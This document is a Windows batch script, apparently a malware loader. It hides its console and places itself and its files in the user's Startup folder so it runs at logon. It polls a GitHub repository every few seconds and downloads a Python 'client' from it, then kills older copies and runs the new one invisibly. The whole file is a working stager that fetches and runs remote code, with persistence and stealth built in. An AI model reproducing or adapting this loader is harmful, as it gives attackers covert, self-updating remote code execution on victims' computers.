@echo off
setlocal enabledelayedexpansion

:: Configuration (templated)
set "GITHUB_USER=sky9262"
set "GITHUB_REPO=abc"
set "GITHUB_BRANCH=main"
set "GITHUB_FILE=client.py"
set "GITHUB_URL=https://github.com/%GITHUB_USER%/%GITHUB_REPO%/raw/refs/heads/%GITHUB_BRANCH%/%GITHUB_FILE%"
set "GITHUB_API_URL=https://api.github.com/repos/%GITHUB_USER%/%GITHUB_REPO%/commits/%GITHUB_BRANCH%"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "CLIENT_FILE=%STARTUP_DIR%\client.py"
set "TEMP_FILE=%TEMP%\client_temp.py"
set "LOG_FILE=%STARTUP_DIR%\client.log"
set "COMMIT_FILE=%STARTUP_DIR%\last_commit.txt"
set "CHECK_INTERVAL=3"

:: Create log function
call :LOG "=== Starting Enhanced Operator - Commit-Based Update Detection (Template) ==="
call :LOG "GitHub User/Repo: %GITHUB_USER%/%GITHUB_REPO%"
call :LOG "Branch: %GITHUB_BRANCH%"
call :LOG "File: %GITHUB_FILE%"
call :LOG "GitHub API URL: %GITHUB_API_URL%"
call :LOG "Check Interval: %CHECK_INTERVAL% seconds"

:: Hide console window
if "%1" neq "hidden" (
    call :LOG "Hiding console window and restarting in background..."
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit /b
)

:MAIN_LOOP
call :LOG "--- Starting check cycle ---"

:: Ensure startup directory exists
if not exist "%STARTUP_DIR%" (
    call :LOG "Creating startup directory: %STARTUP_DIR%"
    mkdir "%STARTUP_DIR%"
)

:: Fetch latest commit SHA from GitHub API
call :LOG "Fetching latest commit SHA from GitHub API..."
powershell -WindowStyle Hidden -Command ^
  "try { $response = Invoke-RestMethod -Uri '%GITHUB_API_URL%' -Headers @{'User-Agent'='Operator-Bot'} -TimeoutSec 10; $response.sha | Out-File -FilePath '%TEMP%\latest_commit.txt' -Encoding UTF8 -NoNewline; Write-Host 'Success: Latest commit fetched' } catch { Write-Host 'Error:' $_.Exception.Message; exit 1 }"

if %ERRORLEVEL% neq 0 (
    call :LOG "ERROR: Failed to fetch commit SHA from GitHub API, retrying in %CHECK_INTERVAL% seconds..."
    goto WAIT_AND_LOOP
)

:: Read latest commit SHA
set "latest_commit="
if exist "%TEMP%\latest_commit.txt" (
    for /f "usebackq delims=" %%i in ("%TEMP%\latest_commit.txt") do set "latest_commit=%%i"
    del "%TEMP%\latest_commit.txt" 2>nul
)

if "!latest_commit!"=="" (
    call :LOG "ERROR: Could not read commit SHA"
    goto WAIT_AND_LOOP
)

call :LOG "Latest GitHub commit: !latest_commit!"

:: Read stored commit SHA
set "stored_commit="
if exist "%COMMIT_FILE%" (
    for /f "usebackq delims=" %%i in ("%COMMIT_FILE%") do set "stored_commit=%%i"
    call :LOG "Stored commit: !stored_commit!"
) else (
    call :LOG "No stored commit found - first run"
)

:: Ensure client.py exists
if not exist "%CLIENT_FILE%" (
    call :LOG "Client.py not found - downloading..."
    goto DOWNLOAD_AND_UPDATE
)

:: If new commit, update
if "!stored_commit!" neq "!latest_commit!" (
    call :LOG "NEW COMMIT DETECTED - Update needed!"
    call :LOG "Old: !stored_commit!"
    call :LOG "New: !latest_commit!"
    goto UPDATE_CLIENT
) else (
    call :LOG "No new commits - checking if client is running..."
)

:: Check if client.py is running
call :LOG "Checking if client.py is running..."
set "client_running=0"

powershell -WindowStyle Hidden -Command ^
  "Get-CimInstance Win32_Process | Where-Object { ($_.Name -eq 'python.exe' -or $_.Name -eq 'pythonw.exe') -and $_.CommandLine -like '*client.py*' } | ForEach-Object { Write-Host 'Found PID:' $_.ProcessId '; CMD:' $_.CommandLine; exit 0 }; exit 1"

if %ERRORLEVEL% equ 0 (
    call :LOG "Client.py IS running"
    set "client_running=1"
) else (
    call :LOG "Client.py is NOT running - will start it"
    goto START_CLIENT
)

goto WAIT_AND_LOOP

:DOWNLOAD_AND_UPDATE
call :LOG "=== DOWNLOADING CLIENT ==="
powershell -WindowStyle Hidden -Command ^
  "try { $timestamp = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); $url = '%GITHUB_URL%' + '?t=' + $timestamp; Invoke-WebRequest -Uri $url -OutFile '%CLIENT_FILE%' -UseBasicParsing -Headers @{'Cache-Control'='no-cache'} -TimeoutSec 15; Write-Host 'Download successful' } catch { Write-Host 'Download failed:' $_.Exception.Message; exit 1 }"

if %ERRORLEVEL% neq 0 (
    call :LOG "ERROR: Failed to download client.py"
    goto WAIT_AND_LOOP
) else (
    call :LOG "Successfully downloaded client.py"
)

:: Store the new commit SHA
echo !latest_commit!>"%COMMIT_FILE%"
call :LOG "Stored new commit SHA: !latest_commit!"
goto START_CLIENT

:UPDATE_CLIENT
call :LOG "=== UPDATING CLIENT ==="

:: Stop existing client processes
call :LOG "Stopping all client processes..."
powershell -WindowStyle Hidden -Command ^
  "Get-CimInstance Win32_Process | Where-Object { ($_.Name -eq 'python.exe' -or $_.Name -eq 'pythonw.exe') -and $_.CommandLine -like '*client.py*' } | ForEach-Object { try { Write-Host 'Killing PID:' $_.ProcessId; Stop-Process -Id $_.ProcessId -Force } catch {} }"

timeout /t 3 /nobreak >nul 2>&1

:: Force delete old client
call :LOG "Removing old client.py..."
if exist "%CLIENT_FILE%" (
    attrib -r -h -s "%CLIENT_FILE%" 2>nul
    del /f /q "%CLIENT_FILE%" 2>nul
)

:: Download new version
call :LOG "Downloading updated client.py..."
powershell -WindowStyle Hidden -Command ^
  "try { $timestamp = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); $url = '%GITHUB_URL%' + '?t=' + $timestamp; Invoke-WebRequest -Uri $url -OutFile '%CLIENT_FILE%' -UseBasicParsing -Headers @{'Cache-Control'='no-cache'} -TimeoutSec 15; Write-Host 'Download successful' } catch { Write-Host 'Download failed:' $_.Exception.Message; exit 1 }"

if %ERRORLEVEL% neq 0 (
    call :LOG "ERROR: Failed to download updated client.py"
    goto WAIT_AND_LOOP
)

:: Store the new commit SHA
echo !latest_commit!>"%COMMIT_FILE%"
call :LOG "Updated to commit: !latest_commit!"
goto START_CLIENT

:START_CLIENT
call :LOG "=== STARTING CLIENT ==="
cd /d "%STARTUP_DIR%"

:: Try pythonw then python with error logging
call :LOG "Starting client.py with error logging..."
start /B "" cmd /c "pythonw.exe "%CLIENT_FILE%" 2>"%STARTUP_DIR%\client_error.log""
if %ERRORLEVEL% neq 0 (
    call :LOG "Failed with pythonw, trying python.exe..."
    start /B "" cmd /c "python.exe "%CLIENT_FILE%" 2>"%STARTUP_DIR%\client_error.log""
    if !ERRORLEVEL! neq 0 (
        call :LOG "ERROR: Failed to start client.py"
        goto WAIT_AND_LOOP
    )
)

call :LOG "Client start command executed"
timeout /t 2 /nobreak >nul 2>&1

if exist "%STARTUP_DIR%\client_error.log" (
    for /f %%i in ('find /c /v "" "%STARTUP_DIR%\client_error.log" 2^>nul') do set "error_lines=%%i"
    if !error_lines! gtr 0 (
        call :LOG "Possible client errors detected:"
        set "line_count=0"
        for /f "delims=" %%i in ('type "%STARTUP_DIR%\client_error.log" 2^>nul') do (
            if !line_count! lss 3 (
                call :LOG "  ERROR: %%i"
                set /a line_count+=1
            )
        )
    )
)

call :LOG "Client startup completed"
goto WAIT_AND_LOOP

:WAIT_AND_LOOP
timeout /t %CHECK_INTERVAL% /nobreak >nul 2>&1
goto MAIN_LOOP

:: Logging function
:LOG
echo [%date% %time%] %~1 >> "%LOG_FILE%"
exit /b
